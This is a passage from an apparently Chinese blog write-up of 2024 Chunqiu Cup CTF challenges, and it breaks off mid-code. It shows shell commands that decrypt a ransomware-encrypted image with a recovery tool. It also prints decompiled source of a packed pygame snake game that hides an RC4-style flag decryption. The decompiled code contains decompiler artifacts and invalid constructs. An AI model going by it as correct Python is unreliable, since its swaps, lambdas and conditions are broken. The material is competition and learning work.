            "url": "https://yhuanhuan01.github.io/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/",
            "title": "2024春秋杯网络安全联赛夏季赛",
            "date_published": "2024-07-06T09:35:53.000Z",
            "content_html": "<h1 id=\"2024春秋杯网络安全联赛夏季赛\"><a class=\"markdownIt-Anchor\" href=\"#2024春秋杯网络安全联赛夏季赛\">#</a> <em>2024 春秋杯网络安全联赛夏季赛</em></h1>\n<h3 id=\"初探勒索病毒\"><a class=\"markdownIt-Anchor\" href=\"#初探勒索病毒\">#</a> 初探勒索病毒</h3>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706170430195.png\" alt=\"image-20240706170430195\"></p>\n<p>提示微信公众号：black-basta-buster-master</p>\n<blockquote>\n<p>523  sed -i ‘s/flags/“flags”/’ ./decryptblocks.py<br>\n524  export SRL_IGNORE_MAGIC=1<br>\n525  ./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block</p>\n</blockquote>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706171100318.png\" alt=\"image-20240706171100318\" style=\"zoom:50%;\" />\n<p>得到图片，传上去</p>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706171238994.png\" alt=\"image-20240706171238994\" style=\"zoom: 80%;\" />\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706171308050.png\" alt=\"image-20240706171308050\"></p>\n<h3 id=\"snack\"><a class=\"markdownIt-Anchor\" href=\"#snack\">#</a> snack</h3>\n<p>python exe 解包</p>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706171438019.png\" alt=\"image-20240706171438019\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># visit https://tool.lu/pyc/ for more information</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Version: Python 3.8</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> pygame</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> key</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    key_length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    S <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> key_length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> S</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_key_stream</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    key_stream <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        key_stream<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> key_stream</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    S <span class=\"token operator\">=</span> initialize<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    key_stream <span class=\"token operator\">=</span> generate_key_stream<span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    decrypted_data <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> <span class=\"token number\">.0</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span> i <span class=\"token operator\">^</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> key_stream<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">.0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">return</span> decrypted_data</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>pygame<span class=\"token punctuation\">.</span>init<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>WINDOW_WIDTH <span class=\"token operator\">=</span> <span class=\"token number\">800</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>WINDOW_HEIGHT <span class=\"token operator\">=</span> <span class=\"token number\">600</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>SNAKE_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>SNAKE_SPEED <span class=\"token operator\">=</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>WHITE <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>BLACK <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>RED <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>window <span class=\"token operator\">=</span> pygame<span class=\"token punctuation\">.</span>display<span class=\"token punctuation\">.</span>set_mode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>WINDOW_WIDTH<span class=\"token punctuation\">,</span> WINDOW_HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>pygame<span class=\"token punctuation\">.</span>display<span class=\"token punctuation\">.</span>set_caption<span class=\"token punctuation\">(</span><span class=\"token string\">'贪吃蛇'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>font <span class=\"token operator\">=</span> pygame<span class=\"token punctuation\">.</span>font<span class=\"token punctuation\">.</span>Font<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>snake <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token number\">210</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token number\">220</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>SNAKE_SPEED<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>food <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_WIDTH <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_HEIGHT <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>key_bytes <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> <span class=\"token number\">.0</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> <span class=\"token number\">.0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">.</span>xor_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token number\">101</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token number\">218</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token number\">172</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token number\">205</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token number\">235</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token number\">195</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token number\">72</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token number\">89</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token number\">130</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token number\">103</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token number\">213</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token number\">120</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token number\">227</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token number\">193</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token number\">67</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token number\">174</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token number\">71</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token number\">162</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token number\">248</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token number\">244</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token number\">12</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token number\">238</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token number\">92</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token number\">160</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token number\">203</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token number\">185</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token number\">155</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>decrypted_data <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key_bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>running <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token keyword\">if</span> running<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    window<span class=\"token punctuation\">.</span>fill<span class=\"token punctuation\">(</span>BLACK<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token keyword\">for</span> event <span class=\"token keyword\">in</span> pygame<span class=\"token punctuation\">.</span>event<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">if</span> event<span class=\"token punctuation\">.</span><span class=\"token builtin\">type</span> <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>QUIT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            running <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span><span class=\"token builtin\">type</span> <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>KEYDOWN <span class=\"token keyword\">or</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_UP<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>SNAKE_SPEED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_DOWN<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> SNAKE_SPEED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_LEFT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>SNAKE_SPEED<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_RIGHT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>SNAKE_SPEED<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            snake_head <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> snake_direction<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> snake_direction<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            snake<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> snake_head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>            snake<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">if</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> food<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                food <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_WIDTH <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_HEIGHT <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                snake<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">if</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> WINDOW_WIDTH <span class=\"token keyword\">and</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> WINDOW_HEIGHT <span class=\"token keyword\">or</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        running <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">for</span> segment <span class=\"token keyword\">in</span> snake<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        pygame<span class=\"token punctuation\">.</span>draw<span class=\"token punctuation\">.</span>rect<span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>segment<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> segment<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    pygame<span class=\"token punctuation\">.</span>draw<span class=\"token punctuation\">.</span>rect<span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">,</span> RED<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>food<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> food<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    score_text <span class=\"token operator\">=</span> font<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''Score: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'''</span></span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    speed_text <span class=\"token operator\">=</span> font<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''Speed: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>SNAKE_SPEED<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'''</span></span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> WHITE<span class=\"token 